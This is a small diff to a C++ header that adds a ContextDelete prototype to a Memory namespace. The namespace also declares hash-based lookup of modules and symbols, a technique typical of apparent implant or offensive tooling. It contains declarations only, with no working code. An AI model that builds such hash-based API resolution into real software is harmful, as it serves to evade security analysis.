@@ -5,6 +5,7 @@
 namespace Memory {
     FUNCTION VOID       ResolveApi();
     FUNCTION VOID       ContextInit();
+    FUNCTION VOID       ContextDelete(HEXANE_CTX *Ctx);
     FUNCTION HMODULE    LdrGetModuleAddress(ULONG hash);
     FUNCTION FARPROC    LdrGetSymbolAddress(HMODULE base, ULONG hash);
     FUNCTION PRSRC      LdrGetIntResource(HMODULE Base, INT RsrcId);
